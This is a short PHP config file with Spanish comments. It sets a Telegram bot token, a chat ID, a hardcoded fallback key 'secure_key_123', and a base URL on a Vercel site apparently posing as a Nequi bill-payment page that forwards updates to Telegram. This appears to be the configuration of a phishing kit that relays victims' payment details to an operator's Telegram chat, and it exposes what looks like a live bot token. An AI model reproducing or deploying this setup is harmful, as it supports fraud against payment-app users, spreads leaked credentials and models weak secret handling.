<?php
// Archivo: config.php

return [
    // Token del bot de Telegram
    'botToken' => '8480342527:AAGJj0hZRWgCJGgb3F5k9XyP7jPumDnI34U',

    // ID del chat donde se enviarán los mensajes
    'chatId' => '-5213969397',

    // URL base para las actualizaciones — apunta al deployment activo
    'baseUrl' => getenv('BASE_URL') ?: 'https://pagatufacturatgo.vercel.app/pago/nequi/process/updatetele.php',

    // Clave de seguridad — debe coincidir con SECURITY_KEY en vercel.json
    'security_key' => getenv('SECURITY_KEY') ?: 'secure_key_123',
];
?>